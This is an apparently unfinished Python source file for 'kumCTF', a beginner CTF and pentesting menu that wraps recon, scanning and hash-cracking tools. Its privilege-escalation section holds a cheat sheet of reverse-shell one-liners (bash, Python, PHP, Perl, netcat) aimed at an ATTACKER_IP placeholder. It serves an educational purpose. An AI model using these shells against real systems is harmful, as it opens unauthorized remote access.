# rich kutuphanesini unutma, sys, subprocess hatta os belki de bazen.
# önce araçlar için fonksiyonlar yazılacak
# sonra menü ve dil seçme fonksiyonları
# en son CLI yazılacak rich ile derlersin
#terminal cleaner eklenecek
#son halinde welcome menüsü yazıldı, welcomedan input alınıp mainmenuye gecilmesi sağlanacak, main menü yapılacak ve modüller içerisinde toplanacak
#birbirleriyle etkileşimleri oluşturulacak ve rich ile tekrardan menülerin üzeirnden geçilecek column row şeklinde bir oluşum düşünüyorum
import subprocess
import os
from rich.console import Console
from rich.text import Text
import pyfiglet


# information gathering, whois , nslookup, whatweb, ping

def run_whois():
    print("whois is a widely used Internet record listing that identifies who owns a domain and how to get in contact with them.\n")
    target = input("Enter the target domain or IP for whois lookup:\nkumCTF>")

    try:
        result = subprocess.run(["whois", target], capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print("An error occured while running whois: ")
        print(e)

def run_ping():
    print("The Ping tool is used to test whether a particular host is reachable across an IP network.\n")
    target = input("Enter the IP for pinging:\nkumCTF>")
    try:
        process = subprocess.Popen(
            ["ping","-c","4",target],
            stdout = subprocess.PIPE,
            stderr = subprocess.STDOUT,
            text=True
        )

        for line in process.stdout:
            print(line.strip())

        process.wait()

    except subprocess.CalledProcessError as e:
        print("An error occured while running ping: ")
        print(e)

def run_dig():
    print("The dig (domain information groper) command is a flexible tool for interrogating DNS name servers.\n")
    target = input("Enter the target domain:\nkumCTF>")

    try:
        result = subprocess.run(["dig", target],text=True,capture_output=True)
        print(result.stdout)
    except FileNotFoundError:
        print("Couldn't find 'dig' in your system, please make sure it is installed in it.")

def run_nslookup():
    print("nslookup lets users enter a host name and find out the corresponding IP address or domain name system (DNS) record")
    target = input("Target ip for reverse DNS lookup:\nkumCTF>")

    try:
        result = subprocess.run(["nslookup", target],text=True,capture_output=True)
        print(result.stdout)
    except FileNotFoundError:
        print("Couldn't find 'nslookup' in your system, please make sure it is installed in it")

def file_back():
    subprocess.run(["cd",".."],shell=True)

def information_gathering():
    print("Welcome to infogatvsvsvs.\npleasechoosethetoolvsvsvs.")
    value_error_count = 0
    choice_error_count= 0
    while True:
        try:
            tool = int(input("1-whois\n2-dig\n3-nslookup\n4-ping\n5-geri\nkumCTF>"))
        except ValueError:
            print("Please enter a valid number")
            value_error_count +=1
            if value_error_count > 3:
                print("Too many invalid attempts. Exiting...")
                exit()
            continue
        match tool:
            case 1:
                run_whois()
                break
            case 2:
                run_dig()
                break
            case 3:
                run_nslookup()
                break
            case 4:
                run_ping()
                break
            case 5:
                file_back()
                break
            case _:
                print("Invalid choice try again!")
                choice_error_count +=1
                if choice_error_count > 3:
                    print("Too many invalid attempts. Exiting...")
                    exit()
                continue


#scanning toolları rustscan nmap netdiscover olarak aklımda var nmap için birkaç scan şekli vereceğim
def scan_ports_with_rustscan():
    print("Rustscan is a tool that helps us to find ports fastly.\n")
    target = input("Please enter the target ip\nkumCTF>")
    print(f"Starting fast port scan for {target}...\n")

    command = [
        "rustscan",
        "-a",target,
        "--ulimit","5000"
    ]

    try:
        result = subprocess.run(command,capture_output=True,text=True)

        print(f"[+] The output of scan:\n")
        print(result.stdout)

        if result.stderr:
            print("[+] Error output:\n")
            print(result.stderr)

    except Exception as e:
        print(f"An error occured!{e}")

def detailed_nmap_scan():
    print("Nmap ('Network Mapper') is a free and open source utility for network discovery and security auditing.\n")
    target = input("Please enter the target ip\nkumCTF>")
    ports = input("Please enter the ports(80,443 if you dont give any port it will scan all of them)\nkumCTF>")


    command = [
        "nmap","-sC",
        "-sV","-sS",
        "-O"
    ]
    if ports:
        command.extend(["-p",ports])
    command.append(target)

    print("[+] Starting detailed nmap scan for the target ip(it may take some time)...")

    try:
        result = subprocess.run(command,text=True,capture_output=True)
        print(result.stdout)
        if result.stderr:
            print("[+] An error ocurred")
            print(result.stderr)
    except Exception as e:
        print(f"[+] An error occured {e}")

def nmap_service_deteciton():
    print("Detects the service&version on the target ip.")
    target = input("Please enter the target ip:\nkumCTF>")
    ports = input("Please enter the ports(like 22,80) if you don't it will scan all of the ports.\nkumCTF>")

    if not target:
        print("[+] Error: Target ip is required!")
    else:
        print(f"[+] Running nmap(service&version detection) on {target} ....")

    command = ["nmap","-sV"]

    if ports:
        ports = ",".join([port.strip() for port in ports.split(',') if port.strip()])
        command.extend(["-p", ports])
    else:
        command.append("-p-")

    command.append(target)

    try:
        result = subprocess.run(command,text=True,capture_output=True)
        print(result.stdout)

        if result.stderr:
            print("[+]An error occured")
            print(result.stderr)

    except Exception as e:
        print(f"[+] An error occured {e}")


def run_netdiscover():
    print("Netdiscover is a tool used for active network discovery.")

    network_range = input("Enter the network range (e.g., 10.0.2.0/24):\nkumCTF> ")
    print(f"[+] Running netdiscover on the {network_range} network....")

    process = None  # process'i burada başlatıyoruz, böylece her yerde kullanabiliriz

    try:
        command = ["sudo", "netdiscover", "-r", network_range]
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1,
                                   universal_newlines=True)

        for line in process.stdout:
            print(line, end='')

        process.stdout.close()
        process.wait()

    except KeyboardInterrupt:
        print("\n[+] Netdiscover operation was interrupted by the user.")
        if process:
            process.terminate()  # Eğer process varsa, terminate et
        scanning()  # scanning fonksiyonunu çağırıyoruz
        return
    except Exception as e:
        print(f"[+] An error occurred: {e}")
        if process:
            process.terminate()
        scanning()
        return

    print("[+] Netdiscover scan completed!")
    scanning()


def scanning():
    print("Welcome to scanning\npleasechoosetoolvs.")
    value_error_count = 0
    choice_error_count = 0
    while True:
        try:
            tool = int(input("1-netdiscover\n2-rustscan\n3-nmap(server&service detection)\n4-nmap detailed scan\n5-back\nkumCTF>"))
        except ValueError:
            print("Please enter a valid number")
            value_error_count += 1
            if value_error_count >= 3:
                print("Too many invalid attempts. Exiting...")
                exit()
            continue

        match tool:
            case 1:
                run_netdiscover()
                break
            case 2:
                scan_ports_with_rustscan()
                break
            case 3:
                nmap_service_deteciton()
                break
            case 4:
                detailed_nmap_scan()
                break
            case 5:
                file_back()
                break
            case _:
                print("Invalid choice, try again!")
                choice_error_count +=1
                if choice_error_count >= 3:
                    print("Too many invalid attempts. Exiting...")
                    exit()
                continue

def show_reverse_shells():
    reverse_shells = {
        "1": {
            "name": "Bash Reverse Shell",
            "code": "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
        },
        "2": {
            "name": "Python Reverse Shell",
            "code": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
        },
        "3": {
            "name": "PHP Reverse Shell",
            "code": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\"); ?>"
        },
        "4": {
            "name": "Nmap Interactive Shell",
            "code": "nmap --interactive\nnmap> !sh"
        },
        "5": {
            "name": "Perl Reverse Shell",
            "code": "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&S\");open(STDOUT,\"&S\");open(STDERR,\"&S\");exec(\"/bin/sh -i\");};'"
        },
        "6": {
            "name": "Netcat Reverse Shell",
            "code": "nc -e /bin/sh ATTACKER_IP PORT"
        }
    }

    print("\nAvailable Reverse Shell Examples:\n")
    for key, value in reverse_shells.items():
        print(f"{key}. {value['name']}")

    choice = input("\nSelect a shell to view the code (or 'q' to go back):\nkumCTF> ")

    if choice.lower() == "q":
        #terminal temizlenecek
        privilege_escalation()
        return
    elif choice in reverse_shells:
        print("\n[+] Reverse Shell Command:\n")
        print(reverse_shells[choice]["code"])
        go_back = input("Press 'q' to go back.\nkumCTF>")
        if go_back == 'q':
            show_reverse_shells()
    else:
        print("\n[!] Invalid choice, returning to menu.\n")
        #kumctf menüsüne dönülecek

def privilege_escalation():
    print("Privilege Escalation Section\n")
    print("kumCTF recommends manual privilege escalation using custom reverse shell payloads.\n")
    print("The following payloads are collected from:\n- GTFOBins (https://gtfobins.github.io)\n- PentestMonkey Reverse Shell Cheatsheet (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\n")
    print("For detailed escalation techniques, refer to the original sources.")

    value_error_count = 0
    choice_error_count = 0

    while True:
        try:
            tool = int(input("\nAvailable Reverse Shell payloads:\n1. View Reverse Shells\n2. Go Back\nkumCTF>"))
        except ValueError:
            print("Please enter a valid number")
            value_error_count += 1
            if value_error_count > 3:
                print("Too many invalid attempts. Exiting...")
                exit()
            continue

        match tool:
            case 1:
                show_reverse_shells()
                break
            case 2:
                file_back()  # ana menuye donecek terminalle silinecek
                break
            case _:
                print("Invalid choice, please try again!")
                choice_error_count += 1
                if choice_error_count > 3:
                    print("Too many invalid attempts. Exiting...")
                    exit()
                continue


def check_tool_installed(tool):
    try:
        subprocess.run([tool, '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except subprocess.CalledProcessError:
        return False


def john_crack(hash_file):
    if not os.path.isfile(hash_file):
        print("[!] Invalid hash file path.")
        return

    if not check_tool_installed('john'):
        print("[!] John the Ripper is not installed.")
        return

    try:
        command = f"john {hash_file}"
        subprocess.run(command, shell=True, check=True)
        print(f"[+] John the Ripper successfully cracked the hashes in {hash_file}.")
    except subprocess.CalledProcessError:
        print("[!] Error with John the Ripper.")


def hashcat_crack(hash_file, wordlist):
    if not os.path.isfile(hash_file):
        print("[!] Invalid hash file path.")
        return
    if not os.path.isfile(wordlist):
        print("[!] Invalid wordlist file path.")
        return

    if not check_tool_installed('hashcat'):
        print("[!] Hashcat is not installed.")
        return

    try:
        command = f"hashcat -m 0 -a 0 {hash_file} {wordlist}"
        subprocess.run(command, shell=True, check=True)
        print(f"[+] Hashcat successfully cracked the hashes in {hash_file}.")
    except subprocess.CalledProcessError:
        print("[!] Error with Hashcat.")

def get_crack_choice():
    print("Hash Cracker")
    print("This module allows you to crack MD5 hashes using a wordlist. MD5 is a widely used cryptographic hash function that produces a 128-bit hash value, but it is considered weak by modern security standards.")
    print("You can use this tool to attempt to recover plaintext values from MD5 hashes using a dictionary attack (wordlist).")
    print("Note: This tool only works with MD5 hashes, the main reason behind it is to show you that you can crack passwords with tools.")
    print("If you want to learn about other hash types or how to crack them, I recommend researching hash algorithms and the tools we're using here.")

    choice = input("Choose an option:\n1-John the Ripper\n2-hashcat\nkumCTF>")

    hash_file = input("Enter the path to the hash file: ")
    wordlist = input("Enter the path to the wordlist (for Hashcat): ")

    if choice == '1':
        john_crack(hash_file)
    elif choice == '2':
        hashcat_crack(hash_file, wordlist)
    else:
        print("Invalid choice")
        #menuye at

console = Console()

def welcome():
    ascii_art = pyfiglet.figlet_format("kumCTF", font="big")
    colored_art = Text(ascii_art, style="green")

    intro_text = """
    [bold green]kumCTF[/bold green] is a beginner-friendly Capture The Flag (CTF) tool designed to help users 
    learn and practice basic pentesting techniques.

    It offers an interactive environment for common penetration testing tasks:
    - Information Gathering
    - Scanning
    - Privilege Escalation
    - Reverse Shell Exploits
    - Password Cracking (MD5 Hashes)

    The purpose of [bold green]kumCTF[/bold green] is to introduce newcomers to CTF challenges and 
    cybersecurity in an easy-to-understand way. It is designed for educational purposes, and its 
    tools are commonly used in penetration testing and ethical hacking scenarios.

    [bold red]Disclaimer:[/bold red]
    This tool is intended for ethical hacking and educational purposes only.
    It is [bold red][underline]NOT[/bold red][/underline] intended for unauthorized or illegal activities. 
    By using this tool, you agree that you are responsible for any actions that result from 
    using [bold green]kumCTF[/bold green].  
    Always ensure you have explicit permission before testing or interacting 
    with any system or network.
    """

    console.print(colored_art)
    console.print("Welcome to [bold green]kumCTF[/bold green]!",justify="center")
    console.print(intro_text,style="bold")